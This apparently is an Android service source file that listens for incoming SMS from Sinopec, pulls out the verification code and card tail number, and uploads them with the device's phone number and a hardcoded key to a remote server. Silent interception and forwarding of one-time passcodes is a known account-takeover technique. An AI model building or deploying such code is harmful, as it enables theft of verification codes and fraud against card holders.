package com.carme.smsread;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.TimeUtils;

import com.carme.smslib.MessageRead;
import com.carme.smsread.network.API;
import com.carme.smsread.network.HttpMethod;

import java.text.SimpleDateFormat;
import java.util.Date;

import retrofit2.Retrofit;
import rx.Subscriber;
import rx.android.schedulers.AndroidSchedulers;
import rx.schedulers.Schedulers;

public class MainService extends Service implements MessageRead.MessageCallBack{
    private static final String KEY = "ilovecarme";

    private MessageRead mMessageRead;
    private TelephonyManager mTelephonyManager;
    private String mPhoneNumber;
    public MainService() {
    }

    @Override
    public void onCreate() {
        super.onCreate();
        mMessageRead = new MessageRead(this);
        IntentFilter filter = new IntentFilter();
        filter.addAction(MessageRead.ACTION_SMS_RECEIVER);
        registerReceiver(mMessageRead,filter);

        mTelephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        mPhoneNumber = mTelephonyManager.getLine1Number();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("sss","service is started!");
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(mMessageRead);
    }

    @Override
    public void callBack(SmsMessage message) {
        String msg= message.getMessageBody();
        if(!msg.contains("中国石化")){
            return;
        }
        try {
            String str1 = msg.split("，")[0];
            String sCode = str1.split("短信验证码为")[1];
            String to  = str1.split("尾号")[1].substring(0,4);
            uploadCode(sCode,to);
        }catch (Exception e){}
    }

    public void uploadCode(String sCode ,String to){
        API.IAPI api = HttpMethod.INSTANCE.mRetrofit.create(API.IAPI.class);
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        String time = dateFormat.format(new Date());
        api.uploadCode(mPhoneNumber,sCode,to,KEY,time).subscribeOn(Schedulers.newThread())
                .observeOn(AndroidSchedulers.mainThread()).subscribe(new Subscriber<String>() {
            @Override
            public void onCompleted() {

            }

            @Override
            public void onError(Throwable e) {
                e.printStackTrace();
            }

            @Override
            public void onNext(String s) {

            }
        });
    }

}
